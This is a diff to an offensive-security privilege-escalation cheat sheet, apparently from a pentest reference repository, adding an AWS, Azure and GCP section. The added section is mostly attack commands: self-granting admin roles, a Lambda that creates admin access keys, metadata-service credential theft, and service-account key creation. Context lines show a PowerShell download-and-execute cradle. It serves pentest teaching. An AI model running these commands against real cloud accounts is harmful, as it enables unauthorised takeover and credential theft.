@@ -29,9 +29,13 @@
   - [Scheduled Tasks](#scheduled-tasks)
   - [Registry AutoRuns](#registry-autoruns)
 - [3. Active Directory Privesc](#3-active-directory-privesc)
-- [4. Automated Tools](#4-automated-tools)
-- [5. MITRE ATT&CK Mappings](#5-mitre-attck-mappings)
-- [6. Related Resources](#6-related-resources)
+- [4. Cloud Privilege Escalation](#4-cloud-privilege-escalation)
+  - [AWS](#aws)
+  - [Azure](#azure)
+  - [GCP](#gcp)
+- [5. Automated Tools](#5-automated-tools)
+- [6. MITRE ATT&CK Mappings](#6-mitre-attck-mappings)
+- [7. Related Resources](#7-related-resources)
 
 ---
 
@@ -873,7 +877,299 @@ lsadump::dcsync /domain:DOMAIN /user:krbtgt
 
 ---
 
-## 4. Automated Tools
+## 4. Cloud Privilege Escalation
+
+Cloud privilege escalation differs from traditional OS privesc — instead of exploiting binaries or kernel flaws, attackers abuse **over-permissioned IAM identities**, **misconfigured role trust relationships**, **service account keys**, and **metadata service access**. The goal is the same: move from lower-privilege access to one that allows full control, credential exfiltration, or lateral movement.
+
+---
+
+### AWS
+
+AWS privilege escalation exploits [IAM policies](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html) and [STS role assumptions](https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html). A misconfigured permission on a single IAM action can be enough to reach `AdministratorAccess`.
+
+**Enumerate current identity and permissions:**
+
+```bash
+# Who am I?
+aws sts get-caller-identity
+
+# List attached policies for the current user
+aws iam list-attached-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)
+
+# List inline policies
+aws iam list-user-policies --user-name TARGET_USER
+
+# Get inline policy document
+aws iam get-user-policy --user-name TARGET_USER --policy-name POLICY_NAME
+
+# What roles can I assume? (check trust policies)
+aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table
+aws iam get-role --role-name TARGET_ROLE
+```
+
+**Key IAM escalation paths:**
+
+| IAM Permission | Escalation Method |
+|---|---|
+| `iam:AttachUserPolicy` | Attach `AdministratorAccess` to your own user |
+| `iam:AttachRolePolicy` | Attach admin policy to a role you can assume |
+| `iam:PutUserPolicy` | Create a permissive inline policy on your user |
+| `iam:CreatePolicyVersion` | Add `Allow: *` version to a managed policy |
+| `iam:SetDefaultPolicyVersion` | Promote a permissive version to default |
+| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with a privileged role attached |
+| `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | Create Lambda with privileged execution role |
+| `sts:AssumeRole` | Assume a role with broader permissions |
+| `iam:CreateLoginProfile` | Create console password for an existing IAM user |
+| `iam:UpdateLoginProfile` | Reset console password for an existing IAM user |
+| `iam:CreateAccessKey` | Create access keys for another IAM user |
+
+**AttachUserPolicy escalation:**
+
+```bash
+# Attach the AWS managed AdministratorAccess policy to your own user
+aws iam attach-user-policy \
+  --user-name YOUR_USERNAME \
+  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+# Verify
+aws iam list-attached-user-policies --user-name YOUR_USERNAME
+```
+
+**PassRole + Lambda escalation:**
+
+```bash
+# Create a Lambda function that exfiltrates credentials or assumes a privileged role
+# 1. Create a ZIP with handler code
+cat > lambda_handler.py << 'EOF'
+import boto3, os
+def handler(event, context):
+    client = boto3.client('iam')
+    # Create admin access key for a target user
+    key = client.create_access_key(UserName='admin-user')
+    return key
+EOF
+zip function.zip lambda_handler.py
+
+# 2. Create the Lambda with the privileged role
+aws lambda create-function \
+  --function-name privesc-func \
+  --runtime python3.12 \
+  --role arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
+  --handler lambda_handler.handler \
+  --zip-file fileb://function.zip
+
+# 3. Invoke it
+aws lambda invoke --function-name privesc-func output.txt
+cat output.txt
+```
+
+**EC2 instance metadata — retrieve IAM role credentials:**
+
+```bash
+# From inside an EC2 instance — IMDSv1 (no token required)
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# List the role name, then retrieve credentials
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+
+# IMDSv2 (token required — default since 2021)
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+```
+
+**Automated AWS privesc scanning:**
+
+```bash
+# Enumerate IAM permissions with enumerate-iam
+git clone https://github.com/andresriancho/enumerate-iam
+python3 enumerate-iam.py --access-key ACCESS_KEY --secret-key SECRET_KEY
+
+# Identify escalation paths with Pacu (AWS exploitation framework)
+git clone https://github.com/RhinoSecurityLabs/pacu
+python3 pacu.py
+# Inside Pacu: run module iam__privesc_scan
+```
+
+> Reference: [Rhino Security Labs — AWS IAM Privilege Escalation Methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
+
+---
+
+### Azure
+
+Azure privilege escalation typically involves abusing **Azure RBAC role assignments**, **Azure AD application permissions**, **managed identities**, and the **Azure Instance Metadata Service (IMDS)**.
+
+**Enumerate current identity and roles:**
+
+```bash
+# Azure CLI — current identity
+az account show
+az ad signed-in-user show
+
+# List role assignments for the current subscription
+az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv) --all
+
+# List all role assignments (if you have read access)
+az role assignment list --all --include-inherited --output table
+
+# List Azure AD groups and memberships
+az ad group list --output table
+az ad group member list --group GROUP_ID
+```
+
+**Azure RBAC escalation — Owner or User Access Administrator:**
+
+If you have `Owner`, `User Access Administrator`, or `Microsoft.Authorization/roleAssignments/write` permission, you can grant yourself additional roles.
+
+```bash
+# Assign yourself Contributor or Owner on a subscription
+az role assignment create \
+  --assignee YOUR_USER_OBJECT_ID \
+  --role "Owner" \
+  --scope "/subscriptions/SUBSCRIPTION_ID"
+
+# Assign on a specific resource group
+az role assignment create \
+  --assignee YOUR_USER_OBJECT_ID \
+  --role "Contributor" \
+  --scope "/subscriptions/SUB_ID/resourceGroups/RG_NAME"
+```
+
+**Azure Managed Identity abuse — from a VM:**
+
+```bash
+# From inside an Azure VM — query IMDS for access token
+curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
+  -H 'Metadata: true'
+
+# The token can be used directly with Azure REST APIs
+TOKEN="<access_token_from_above>"
+curl -X GET "https://management.azure.com/subscriptions?api-version=2020-01-01" \
+  -H "Authorization: Bearer $TOKEN"
+```
+
+**Azure AD application privilege escalation:**
+
+```bash
+# List service principals and their app role assignments
+az ad sp list --all --query '[].{name:displayName, id:id, appId:appId}' -o table
+
+# If you own an application registration, add a privileged app role assignment
+# (e.g., assign the app "Directory.ReadWrite.All" via MS Graph)
+
+# Check application permissions (Graph API)
+az ad app permission list --id APP_ID
+
+# Add credential to a service principal you control
+az ad sp credential reset --id SP_OBJECT_ID
+```
+
+**PowerShell-based Azure AD enumeration (AzureAD / Az module):**
+
+```powershell
+# Connect
+Connect-AzAccount
+Connect-AzureAD
+
+# List role assignments
+Get-AzRoleAssignment | Select-Object DisplayName, RoleDefinitionName, Scope
+
+# Find users with privileged Azure AD roles
+Get-AzureADDirectoryRole | ForEach-Object {
+    $role = $_
+    Get-AzureADDirectoryRoleMember -ObjectId $role.ObjectId |
+        Select-Object @{N='Role';E={$role.DisplayName}}, DisplayName, UserPrincipalName
+}
+
+# List all service principals
+Get-AzureADServicePrincipal -All $true | Select-Object DisplayName, AppId, ObjectId
+```
+
+> Reference: [Azure Privilege Escalation via Azure API Permissions Abuse](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48) · [MicroBurst](https://github.com/NetSPI/MicroBurst)
+
+---
+
+### GCP
+
+GCP privilege escalation often involves **service account key creation**, **workload identity impersonation**, **IAM role binding manipulation**, and **GCE metadata server access**.
+
+**Enumerate current identity and IAM permissions:**
+
+```bash
+# Current identity
+gcloud auth list
+gcloud config get-value account
+
+# List IAM policy on the project
+gcloud projects get-iam-policy PROJECT_ID
+
+# List service accounts
+gcloud iam service-accounts list --project PROJECT_ID
+
+# Get roles for a specific member
+gcloud projects get-iam-policy PROJECT_ID \
+  --flatten="bindings[].members" \
+  --filter="bindings.members:user:YOUR_EMAIL" \
+  --format="value(bindings.role)"
+```
+
+**Service account key creation (if `iam.serviceAccountKeys.create` is granted):**
+
+```bash
+# Create a JSON key for a privileged service account
+gcloud iam service-accounts keys create key.json \
+  --iam-account PRIVILEGED_SA@PROJECT_ID.iam.gserviceaccount.com
+
+# Activate the key
+gcloud auth activate-service-account --key-file key.json
+
+# Verify new identity
+gcloud auth list
+gcloud config get-value account
+```
+
+**IAM role binding escalation (if `resourcemanager.projects.setIamPolicy` is granted):**
+
+```bash
+# Grant yourself Owner on the project
+gcloud projects add-iam-policy-binding PROJECT_ID \
+  --member "user:YOUR_EMAIL" \
+  --role "roles/owner"
+```
+
+**GCE metadata server — retrieve service account token:**
+
+```bash
+# From inside a GCE instance
+# List service accounts on the VM
+curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" \
+  -H "Metadata-Flavor: Google"
+
+# Get an access token for the default service account
+curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
+  -H "Metadata-Flavor: Google"
+
+# Use the token to call GCP APIs
+TOKEN=$(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
+  -H "Metadata-Flavor: Google" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
+
+curl -H "Authorization: Bearer $TOKEN" \
+  "https://cloudresourcemanager.googleapis.com/v1/projects"
+```
+
+**Workload identity impersonation:**
+
+```bash
+# If you can impersonate a service account (roles/iam.serviceAccountTokenCreator)
+gcloud auth print-access-token --impersonate-service-account PRIVILEGED_SA@PROJECT_ID.iam.gserviceaccount.com
+```
+
+> Reference: [GCP IAM Privilege Escalation — Dylan Ayrey (GitLab Security)](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/) · [GCP IAM Escalation Techniques — Rhino Security Labs](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
+
+---
+
+## 5. Automated Tools
 
 | Tool | Platform | Usage |
 |------|----------|-------|
@@ -885,6 +1181,11 @@ lsadump::dcsync /domain:DOMAIN /user:krbtgt
 | PrivescCheck | Windows PS | `Import-Module PrivescCheck.ps1; Invoke-PrivescCheck` |
 | GTFOBins | Linux | [gtfobins.github.io](https://gtfobins.github.io) |
 | LOLBAS | Windows | [lolbas-project.github.io](https://lolbas-project.github.io) |
+| Pacu | AWS | `python3 pacu.py` — AWS exploitation and IAM privesc scanning |
+| enumerate-iam | AWS | `python3 enumerate-iam.py --access-key KEY --secret-key SECRET` |
+| MicroBurst | Azure | PowerShell-based Azure enumeration and privesc |
+| ScoutSuite | Multi-cloud | `python3 scout.py aws` — cloud security posture auditing |
+| CloudSploit | Multi-cloud | [github.com/aquasecurity/cloudsploit](https://github.com/aquasecurity/cloudsploit) — misconfiguration scanner |
 
 ```bash
 # linPEAS — full run with color output
@@ -905,7 +1206,7 @@ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://A
 
 ---
 
-## 5. MITRE ATT&CK Mappings
+## 6. MITRE ATT&CK Mappings
 
 | Technique | ATT&CK ID | Platform |
 |-----------|-----------|----------|
@@ -920,16 +1221,23 @@ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://A
 | Kerberoasting | [T1558.003](https://attack.mitre.org/techniques/T1558/003/) | AD |
 | AS-REP Roasting | [T1558.004](https://attack.mitre.org/techniques/T1558/004/) | AD |
 | DCSync | [T1003.006](https://attack.mitre.org/techniques/T1003/006/) | AD |
+| Valid Accounts (Cloud) | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) | AWS/Azure/GCP |
+| Cloud Account Manipulation | [T1098.001](https://attack.mitre.org/techniques/T1098/001/) | AWS/Azure/GCP |
+| Cloud IAM Role Hijacking | [T1548.005](https://attack.mitre.org/techniques/T1548/005/) | AWS |
+| Steal or Forge Authentication Certificates | [T1649](https://attack.mitre.org/techniques/T1649/) | Azure AD |
+| Unsecured Credentials: Cloud Instance Metadata | [T1552.005](https://attack.mitre.org/techniques/T1552/005/) | AWS/Azure/GCP |
 
 ---
 
-## 6. Related Resources
+## 7. Related Resources
 
 ### Internal
 
 - [Penetration Testing](disciplines/penetration-testing.md)
 - [Active Directory](disciplines/active-directory.md)
+- [Cloud Security](disciplines/cloud-security.md)
 - [Pentest Checklists](PENTEST_CHECKLISTS.md)
+- [Cloud Attack Reference](CLOUD_ATTACK_REFERENCE.md)
 - [HTB Machine Index](research/HTB_MACHINE_INDEX.md)
 
 ### External
@@ -944,3 +1252,7 @@ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://A
 | MITRE ATT&CK | [attack.mitre.org](https://attack.mitre.org) |
 | impacket | [github.com/fortra/impacket](https://github.com/fortra/impacket) |
 | PEASS-ng (linPEAS/winPEAS) | [github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng) |
+| Pacu (AWS exploitation) | [github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu) |
+| AWS IAM Privesc Methods | [rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/) |
+| MicroBurst (Azure) | [github.com/NetSPI/MicroBurst](https://github.com/NetSPI/MicroBurst) |
+| GCP Privesc — Rhino Security | [rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/) |
